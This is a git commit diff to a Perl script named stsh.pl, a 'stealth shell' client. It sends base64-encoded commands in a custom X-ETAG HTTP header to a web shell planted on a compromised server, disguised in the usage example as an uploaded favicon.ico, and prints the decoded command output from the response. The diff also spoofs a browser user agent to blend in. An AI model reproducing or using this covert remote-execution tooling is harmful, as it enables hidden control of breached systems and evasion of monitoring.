44285c8597d1a67000f87dd6a1109f581f5b5bf6
Eldar Marcussen <wireghoul@justanotherhacker.com>
2012-01-31 16:02:00 +1100

    Stealth shell interface

--- stsh.pl
+++ stsh.pl
@@ -11,17 +11,24 @@ use LWP::UserAgent;
 my $url = $ARGV[0];
 pop(@ARGV); #keep readline happy
 my $ua = LWP::UserAgent->new;
+$ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16');
 
 sub usage {
     print "Usage: $0 url\nExample: $0 http://vuln.com/upload/favicon.ico\n";
     exit 2;
 }
 
-my $cmd = ''; my $b64;
+my $cmd = '';
+print "Connecting to shell at $url - type 'exit' to exit";
 until ($cmd eq 'exit') {
-  print "shell> ";
-  $cmd = readline;
-  chomp $cmd;
-  $b64 = encode_base64($cmd);
-  # magic    
+    print "\nshell> ";
+    $cmd = readline;
+    chomp $cmd;
+    my $payload = 'AA'.encode_base64($cmd);
+    my $response = $ua->get( $url, 'X-ETAG' => $payload);
+    if ($response->header('X-ETAG')) {
+      print decode_base64(substr($response->header('X-ETAG'),2));
+    } else {
+      print "Error! No payload in response!\n";
+    }
 }
